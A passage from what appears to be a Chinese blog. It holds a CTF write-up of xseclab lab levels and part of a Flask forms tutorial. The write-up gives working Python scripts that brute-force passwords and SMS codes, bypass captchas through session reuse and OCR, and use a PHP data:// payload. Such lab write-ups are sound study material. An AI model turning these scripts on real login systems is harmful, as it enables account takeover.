class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:<span class="number">1000</span>,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&#x27;</span>,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+each*<span class="number">1000</span>,<span class="number">2000</span>+each*<span class="number">1000</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="第七关逗比验证码第三期">第七关:逗比验证码第三期</h5><p>尼玛，验证码怎么可以这样逗比。。 验证码做成这样，你家里人知道吗？ <a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php">通关地址</a> 这里他说有session的验证,但由于我第二个脚本就已经用到了session,所以第二个脚本随意改一下就可以get第三个的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:<span class="number">1000</span>,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php&#x27;</span>,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+each*<span class="number">1000</span>,<span class="number">2000</span>+each*<span class="number">1000</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="第八关微笑一下就能过关了">第八关:微笑一下就能过关了</h5><p>尼玛，碰到这样的题我能笑得出来嘛... <a href="http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php">通关地址</a> 源码审计的题,看源代码之后发现几个点,第一个get请求的键为^<em>^但是在正则判断里面又不允许键里面存在</em> 这里用到了php的一个特性(学习到了....),php里面的键包含<strong>[]</strong>以及<strong>.</strong>的时候会被改写成_,所以我们key的值写<sup>.</sup>就好了,然后file方面我第一个想到了php://input,但是这里我(●'◡'●)老是搞不出来.....后来去网上看了一下,有同学说用url解码一下,然后学习了一个新脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib, sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> urllib.quote(<span class="string">&quot;(●&#x27;◡&#x27;●)&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以这里得到了(●'◡'●)的urlencode值,然后post发过去就好了 当然,另外一种思路是用data协议....(以前都没听过...) payload:http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?<sup>.</sup>=data://text/plain;charset=unicode,(●'◡'●) 然后就搞到flag了</p><h5 id="第九关逗比的手机验证码">第九关:逗比的手机验证码</h5><p>你的手机号码是13388886666，验证码将会以弹窗的形式给出 <a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/#">通关地址</a> 不知道这道题出的什么鬼,反正很简单,直接获取验证码然后改手机号码登录就ok了,目测又是验证码和session对应了,然后回话不改变但是手机改变达到了目的</p><h5 id="第十关基情燃烧的岁月">第十关:基情燃烧的岁月</h5><p>Tips:你是一名黑客，你怀疑你的“（男/女）闺蜜”的出轨了，你要登陆TA手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码:13388886666 <a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/">通关地址</a> 比较简单,验证码暴破就ok了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=6ebf3a78c82d6727a9fe117956aaa083&#x27;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="string">&#x27;13388886666&#x27;</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/vcode.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13388886666</span>,</span><br><span class="line"><span class="string">&#x27;vcode&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(each*<span class="number">100</span>+<span class="number">100</span>,each*<span class="number">100</span>+<span class="number">200</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到回复:你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br />前任的手机号码是:13399999999 所以再暴破一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=6ebf3a78c82d6727a9fe117956aaa083&#x27;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="number">13399999999</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/vcode.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13399999999</span>,</span><br><span class="line"><span class="string">&#x27;vcode&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(each*<span class="number">100</span>+<span class="number">100</span>,each*<span class="number">100</span>+<span class="number">200</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="第十一关验证码识别">第十一关:验证码识别</h5><p>Tips:验证码依然是3位数 <a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php">通关地址</a> 这里加入了验证码来阻碍暴破,所以这里我们使用pytesseract库来帮我们识别 代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php&#x27;</span>,headers=headers)</span><br><span class="line">data=&#123;<span class="string">&#x27;getcode&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;mobi&#x27;</span>:<span class="number">13388886666</span>&#125;</span><br><span class="line">u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php&#x27;</span>,headers=headers,data=data)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    img=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#x27;</span>,headers=headers).content</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img)</span><br><span class="line">    vcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    error_time=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> vcode==<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> error_time&lt;<span class="number">3</span>:</span><br><span class="line">        vcode=pytesseract.image_to_string(Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>))</span><br><span class="line">        vcode=vcode.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> error_time&gt;=<span class="number">3</span>:</span><br><span class="line">            img=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#x27;</span>,headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img)</span><br><span class="line">            vcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            error_time=<span class="number">0</span></span><br><span class="line">        error_time+=<span class="number">1</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="number">13388886666</span>,</span><br><span class="line"><span class="string">&#x27;mobi_code&#x27;</span>:each,</span><br><span class="line"><span class="string">&#x27;user_code&#x27;</span>:vcode,</span><br><span class="line"><span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">    r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php&#x27;</span>,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>然后后面的xss不知道为什么打不开....脚本关就到这里了,验证码的东西还真学到了不少..</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flask学习(3)表单</title>
      <link href="/2017/08/19/flask%E5%AD%A6%E4%B9%A03%E8%A1%A8%E5%8D%95/"/>
      <url>/2017/08/19/flask%E5%AD%A6%E4%B9%A03%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h4 id="一配置">一:配置</h4><p>为了处理表单我们使用Flask-WTF插件,里面包含一些表单的创建和验证,csrf的保护.但在这之前我们要进行一波配置. 我们在microblog目录下创建一个配置文件(config.py)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CSRF_ENABLED = True</span><br><span class="line">SECRET_KEY = &#x27;you-will-never-guess&#x27;</span><br></pre></td></tr></table></figure><p>配置好了之后,我们要让Flask来读取使用,所以我们要在flask应用程序被创建后去app的<strong>init</strong>.py里面进行修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(<span class="string">&#x27;config&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure><p>其中app.config.from_object里面的参数是在app的上级目录下的配置文件</p><h4 id="二用户登录表单">二:用户登录表单</h4><p>这里使用openid进行登录 什么是openid呢?这是一个用于身份认证的一个东西,它的原理是</p><ol type="1"><li><p>你首先得拥有一个合法的OpenID帐号，也就是说需要在一个验证服务器申请了一个帐号。</p></li><li><p>你有了这个帐号之后，就可以在任何一个其他支持OpenID验证的网站，并且用你上面申请的OpenID进行登录</p></li><li><p>因为这个网站并不知道你的身份是否正确，所以它会请求你的验证服务器对你的身份进行验证。</p></li><li><p>验证服务器告诉网站说，你是合法用户</p></li><li><p>网站接受你的身份，让你进入。</p></li></ol><p>下面开始写第一个表单文件(app/forms.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext.wtf <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, BooleanField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">Form</span>):</span><br><span class="line">     openid = StringField(<span class="string">&#x27;openid&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">     remember_me = BooleanField(<span class="string">&#x27;remember_me&#x27;</span>, default=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>在这里写完了LoginForm之后,在views里面导入一下,实例化一下,然后传给模版里面就可以直接生成表单.</p><h4 id="三表单视图">三:表单视图</h4><p>直接在views里面改就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,flash,redirect</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> LoginForm</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;Miguel&#x27;</span>&#125;</span><br><span class="line">    posts = [&#123;<span class="string">&#x27;author&#x27;</span>:&#123;<span class="string">&quot;nickname&quot;</span>:<span class="string">&#x27;John&#x27;</span>&#125;,<span class="string">&#x27;body&#x27;</span>:<span class="string">&#x27;Beautiful day in Portland!&#x27;</span>&#125;,&#123;<span class="string">&#x27;author&#x27;</span>:&#123;<span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;Susan&#x27;</span>&#125;,<span class="string">&#x27;body&#x27;</span>:<span class="string">&#x27;The Avengers movie was so cool!&#x27;</span>&#125;]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,title = <span class="string">&quot;Home!&quot;</span>,user=user,posts=posts)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        flash(<span class="string">&#x27;Login requested for OpenID=&quot;&#x27;</span> + form.openid.data+<span class="string">&#x27;&quot;,remember_me=&#x27;</span>+<span class="built_in">str</span>(form.remember_me.data))</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,title=<span class="string">&#x27;Sign In&#x27;</span>,form=form,providers=app.config[<span class="string">&#x27;OPENID_PROVIDERS&#x27;</span>])</span><br></pre></td></tr></table></figure><p>其实也就是导入一个LoginForm然后实例化传入模版 这里注意路由装饰器的<strong>methods</strong>参数,里面写["GET","POST"]就是这个视图接受get和post请求 如果不带的话是默认接受get请求 <strong>validate_on_submit</strong> 做了所有的表单处理 在表单展示的时候它返回false 在提交请求的时候它会收集数据然后验证,全部通过的话返回true否则返回false <strong>flash</strong> 这个函数的作用是快速地返回给用户页面上的一个消息. 这个函数在生产服务器的时候可以用来提供反馈给用户有关的行动 当然这个函数要是要返回给用户的话必须要在模版里面加上一些东西 比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">  &#123;% if messages %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">flashes</span>&gt;</span></span><br><span class="line">    &#123;% for message in messages %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><p><strong>错误处理</strong> 当用户验证失败的时候我们希望可以返回错误的信息,比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for error in form.openid.errors %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span>[&#123;&#123; error &#125;&#125;]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="四改表单模版">四:改表单模版</h4><p>模版先继承前面的base.html,然后我们再接受传入的form参数进行布局</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">set_openid</span>(<span class="params">openid,pr</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        u = openid.<span class="title function_">search</span>(<span class="string">&quot;&lt;username&gt;&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (u != -<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            user = <span class="title function_">prompt</span>(<span class="string">&#x27;Enter your&#x27;</span>+pr+<span class="string">&#x27; username:&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            openid = openid.<span class="title function_">substr</span>(<span class="number">0</span>,u)+user</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        form = <span 